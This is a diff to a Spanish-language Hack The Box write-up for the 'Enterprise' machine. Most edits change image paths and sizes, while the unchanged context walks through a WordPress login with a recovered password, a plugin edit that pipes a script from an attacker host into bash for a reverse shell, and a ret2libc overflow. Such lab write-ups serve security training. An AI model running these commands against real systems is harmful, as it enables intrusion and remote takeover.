@@ -236,7 +236,7 @@ So:
 
 Y ahora volviendo a probar en la web pero ahora contra el dominio:
 
-![112page80_with_etc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_with_etc.png)
+![112page80_with_etc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_with_etc.png)
 
 Ahora tenemos una página mucho más bonita :) Veamos que podemos destacar...
 
@@ -250,13 +250,13 @@ En el código fuente vemos varias cosillas:
 
 Si entramos a cualquier post vemos un usuario para guardar:
 
-![112page80_post51_foundUser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_post51_foundUser.png)
+![112page80_post51_foundUser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_post51_foundUser.png)
 
 * **william.riker**.
 
 Para validar si estamos sobre **WordPress** podemos apoyarnos de la extensión **Wappalyzer** y jugando con varias URL mantenidas por **WP**:
 
-![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_wpAdmin.png)
+![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png)
 
 Bien, tenemos el portal login por default de **WordPress** al redireccionarnos a `wp-admin/`. Jugando con **Wappalyzer** nos indica que estamos ante la versión `4.8.1` de **WP**, además nos indica la versión **PHP** (`5.6.31`) y que la base de datos usada es **MySQL**...
 
@@ -305,7 +305,7 @@ Pero viendo cada uno en la web no hay nada relevante... Haciendo fuzzing tampoco
 
 ### Puerto 443 [⌖](#puerto-443) {#puerto-443}
 
-![112page443](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page443.png)
+![112page443](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443.png)
 
 La página por default de **Apache**.
 
@@ -341,7 +341,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 Tenemos la ruta `files`, si la visitamos obtenemos:
 
-![112page443_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page443_files.png)
+![112page443_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443_files.png)
 
 Opa, un archivo `.zip`, pues descarguemoslo a ver que contiene...
 
@@ -1098,25 +1098,25 @@ Jmm, pues viendo quien creo esos posts (columna `post_author`) obtenemos el ID *
 
 #### WordPress login done
 
-![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_wpAdmin.png)
+![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png)
 
 Probando con `william.riker:u*Z14ru0p#ttj83zS6` logramos entrar :)
 
-![112page80_wpAdmin_dash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_wpAdmin_dash.png)
+![112page80_wpAdmin_dash](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_dash.png)
 
 Perfectoooo, tamos dentro :')
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112birDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112birDance.gif" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>
 
 Bastante camino para llegar acá :) Ahora es muy simple es entablarnos una reverse Shell, simplemente debemos modificar algunos de los plugins que existan en el sitio, como ya jugamos con el plugin **lcars**, sabemos que existe.
 
 Vamos a **Plugins** > **Editor**:
 
-![112page80_wpAdmin_plugins](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_wpAdmin_plugins.png)
+![112page80_wpAdmin_plugins](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins.png)
 
 Seleccionamos ahora el plugin **lcars** (donde esta la flecha 😜) y damos clic en **Select**:
 
-![112page80_wpAdmin_plugins_lcars](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112page80_wpAdmin_plugins_lcars.png)
+![112page80_wpAdmin_plugins_lcars](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin_plugins_lcars.png)
 
 Perfecto, vemos los 3 archivos con los que ya jugamos y su contenido, solo que ahroa tenemos la posibilidad de editarlos, validemos que usuario esta ejecutando el servicio web, usare `lcars.php`:
 
@@ -1168,7 +1168,7 @@ system("curl http://10.10.14.17:8000/rev.sh | bash");
 
 Simplemente hacemos una petición hacia el archivo y obtenemos nuestra reverse Shell:
 
-![112bash_wwwdata_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/htb/enterprise/112bash_wwwdata_RevSH.png)
+![112bash_wwwdata_RevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_RevSH.png)
 
 Hagamos tratamiento de la TTY para asi poder hacer `CTRL+C` sin miedo a perder la terminal, además de poder movernos entre comandos y tener historial :)
 
@@ -1893,7 +1893,7 @@ $
 [*] Got EOF while sending in interactive
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112sad_ok.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112sad_ok.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>
 
 Jmmm, dando unas vueltas cai en cuenta que el programa está tomando **nuestras** direcciones en memoria, o sea con las que interactúa el programa en **nuestro sistema**, tiene sentido que no sirva, ya que esas **direcciones** probablemente no sean las mismas que usa el programa en la máquina víctima... Juguemos con ella (ya que tiene **gdb**) para extraer las direcciones en memoria y validar si ese es el error:
 
@@ -1995,9 +1995,9 @@ enterprise.htb
 $  
 ```
 
-PERF3ct0000000000oooOOOOOOOOooooooooooo
-
 <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112boom.gif" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>
+
+PERF3ct0000000000oooOOOOOOOOoooooooVoooo.............
 
 Tenemos una `sh` en la máquina víctima aprovechándonos de un buffer overflow con el ataque **ret2libc** (: que belleza eh!
 
